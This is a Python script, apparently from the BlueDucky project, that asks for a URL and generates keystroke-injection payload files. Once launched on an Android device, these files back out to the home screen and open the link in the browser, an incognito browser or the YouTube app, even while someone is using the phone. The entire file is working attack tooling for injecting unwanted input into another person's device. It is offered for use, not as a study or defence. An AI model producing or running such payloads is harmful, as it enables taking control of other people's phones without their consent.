import os

def print_blue(text):
    # ANSI escape codes for blue text
    BLUE = '\033[94m'
    RESET = '\033[0m'
    print(BLUE + text + RESET)

def main():
    # ASCII Art
    ascii_art = r"""
⠀⠀⠀⠀⠀⠀⢀⣴⠟⠛⠛⠛⠛⠛⠛⠷⢶⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⡿⠃⠀⣀⣀⣀⣀⡀⠀⠀⢀⣭⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡿⠁⠀⣼⡏⢉⣿⣿⣿⡆⠀⣾⢡⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⠃⠀⠀⠸⣷⣄⣻⣿⡿⠁⠀⠙⠛⠛⢻⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠉⠉⠉⢀⣴⡾⠿⠿⢿⡿⢷⣤⣀⡀⠀⠀⠀
⠀⠀⠀⠀⣿⡀⠀⠀⠀⠀⠀⠀⢰⣿⠉⠀⠺⠇⠘⠃⠀⠉⠙⠛⢷⣄⠀
⠀⠀⠀⠀⠸⣧⠀⠀⠀⠀⠀⠀⠘⠿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⢀⣿⠂
⠀⠀⠀⠀⠀⣹⣧⡀⠀⠀⠀⠀⠀⠀⠀⢉⣹⡿⠷⢶⢶⡶⠶⠛⠛⠁⠀
⠀⠀⢠⣶⠟⠋⠙⠛⠀⠀⠀⠀⠀⠀⠈⢿⣏⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⡟⣧⡀⠀⠀⠀⠀⠀⠀⠀
⢸⡟⠀⠀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀⠀⠘⣷⠘⣧⠀⠀⠀⠀⠀⠀⠀
⢸⣷⠀⠀⠀⠀⠀⢀⣿⠀⠀⠀⠀⠀⠀⠀⠀⢹⡇⢹⡇⠀⠀⠀⠀⠀⠀
⠀⢿⡄⠀⠀⠀⠀⣼⠇⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⢸⡇⠀⠀⠀⠀⠀⠀
⠀⠈⢿⣄⠀⠀⣰⣿⡀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣧⡿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣧⣀⡿⠉⠛⢷⣶⠶⠤⢦⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠟⠃⠀⠀⢸⡇⠀⠀⢸⣇⣠⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣷⡶⠀⠘⠻⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
    
    # Print ASCII art
    print_blue(ascii_art)

    # Print blue double solid line
    print_blue("=========================================")
    
    print_blue("Welcome to BlueDucky Payload Generator!")
    
    print_blue("=========================================")

    # Step 1: Check if Android will be in use. If marked yes, it will send BACK commands to the device leading it to the home page
    android_in_use = input("Will the Android device be in use when the payload is launched? (1: Yes, 2: No) [Default: 1]: ")
    if android_in_use == '':
        android_in_use = '1'  # Default to Yes if Enter is pressed
    elif android_in_use not in ['1', '2']:
        print("Invalid option! Exiting.")
        return

    # Step 2: Ask for browser or YouTube
    browser_or_youtube = input("Will you be opening a browser or YouTube link? (1: Browser, 2: YouTube link): ")
    
    if browser_or_youtube == '1':
        # Default option: Default Browser
        browser_type = input("Which type of browser? (1: Default browser, 2: Incognito browser) [Default: 1]: ")
        if browser_type == '':
            browser_type = '1'  # Default to Default Browser
        elif browser_type not in ['1', '2']:
            print("Invalid option! Exiting.")
            return
        link_text = input("Please enter the link: ")
    elif browser_or_youtube == '2':
        link_text = input("Please enter the YouTube link: ")
    else:
        print("Invalid option! Exiting.")
        return

    # Prepare the output text
    payload_lines = ["REM Opens", "DELAY 200"]

    if browser_or_youtube == '2':
        payload_lines[0] += f" {link_text} via Youtube App"
        payload_lines.extend([
            "ESCAPE",
            "DELAY 400",
            "ESCAPE",
            "DELAY 400",
            "ESCAPE",
            "DELAY 300",
            f"STRING {link_text}",
            "DELAY 300",
            "ENTER",
            "DELAY 300"
        ])
    elif browser_or_youtube == '1':
        if browser_type == '1':
            payload_lines[0] += f" {link_text} via Browser"
            payload_lines.extend([
                "ESCAPE",
                "GUI d",
                "ALT ESCAPE",
                "GUI b",
                "DELAY 700",
                "BROWSER",
                "DELAY 700",
                "CTRL l",
                "DELAY 300",
                f"STRING {link_text}",
                "DELAY 500",
                "ENTER",
                "DELAY 300"
            ])
        elif browser_type == '2':
            payload_lines[0] += f" {link_text} via Incognito Browser"
            payload_lines.extend([
                "ESCAPE",
                "GUI d",
                "ALT ESCAPE",
                "GUI b",
                "DELAY 700",
                "PRIVATE_BROWSER",
                "DELAY 700",
                "CTRL l",
                "DELAY 300",
                f"STRING {link_text}",
                "DELAY 300",
                "ENTER",
                "DELAY 300"
            ])
    # These commands is the equivalent of pressing the back button serveral times which leads to the home page
    if android_in_use == '1':
        payload_lines[2:2] = [
            "ESCAPE",
            "DELAY 400",
            "ESCAPE",
            "DELAY 400",
            "ESCAPE",
            "DELAY 300"
        ]

    # Clean up the link text for file naming
    clean_link_text = link_text.replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "_").replace(":", "_")
    
    # Determine the output file name
    if browser_or_youtube == '1':
        if browser_type == '1':
            output_file_name = f"Browser {clean_link_text} Payload.txt"
        else:
            output_file_name = f"Incognito Browser {clean_link_text} Payload.txt"
    else:
        output_file_name = f"YouTube {clean_link_text} Payload.txt"

    # Create the directory if it doesn't exist
    directory = "Generated Payloads"
    os.makedirs(directory, exist_ok=True)

    # Write the payload to a text file
    with open(os.path.join(directory, output_file_name), 'w') as file:
        file.write('\n'.join(payload_lines))

    print(f"Payload successfully generated and saved as '{output_file_name}' in '{directory}' folder.")

if __name__ == "__main__":
    main()
